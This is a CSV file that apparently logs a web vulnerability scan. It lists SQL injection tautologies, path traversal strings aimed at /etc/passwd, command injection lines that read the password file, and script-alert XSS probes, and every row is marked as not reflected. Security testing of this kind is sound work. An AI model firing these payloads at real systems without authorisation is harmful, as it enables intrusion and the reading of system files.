payload,reflected,error
' OR 57=57 --,False,
' OR 92=92 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #40,False,
' OR 100=100 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
<script>alert(172)</script>,False,
<script>alert(124)</script>,False,
' OR 107=107 --,False,
; cat /etc/passwd #195,False,
' OR 154=154 --,False,
' OR 118=118 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
' OR 42=42 --,False,
; cat /etc/passwd #20,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
' OR 128=128 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
' OR 56=56 --,False,
<script>alert(175)</script>,False,
; cat /etc/passwd #188,False,
<script>alert(23)</script>,False,
<script>alert(51)</script>,False,
<script>alert(52)</script>,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
' OR 54=54 --,False,
' OR 67=67 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #155,False,
<script>alert(162)</script>,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
' OR 84=84 --,False,
<script>alert(182)</script>,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #18,False,
<script>alert(74)</script>,False,
../../../../../../../etc/passwd,False,
' OR 163=163 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #162,False,
; cat /etc/passwd #27,False,
; cat /etc/passwd #42,False,
; cat /etc/passwd #178,False,
; cat /etc/passwd #17,False,
<script>alert(122)</script>,False,
<script>alert(80)</script>,False,
; cat /etc/passwd #37,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
<script>alert(45)</script>,False,
' OR 133=133 --,False,
../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #191,False,
; cat /etc/passwd #75,False,
<script>alert(65)</script>,False,
' OR 111=111 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
<script>alert(194)</script>,False,
; cat /etc/passwd #9,False,
<script>alert(195)</script>,False,
<script>alert(167)</script>,False,
' OR 172=172 --,False,
' OR 102=102 --,False,
; cat /etc/passwd #147,False,
<script>alert(125)</script>,False,
; cat /etc/passwd #92,False,
<script>alert(35)</script>,False,
<script>alert(155)</script>,False,
<script>alert(47)</script>,False,
; cat /etc/passwd #73,False,
' OR 44=44 --,False,
' OR 69=69 --,False,
' OR 70=70 --,False,
; cat /etc/passwd #39,False,
; cat /etc/passwd #145,False,
' OR 49=49 --,False,
' OR 60=60 --,False,
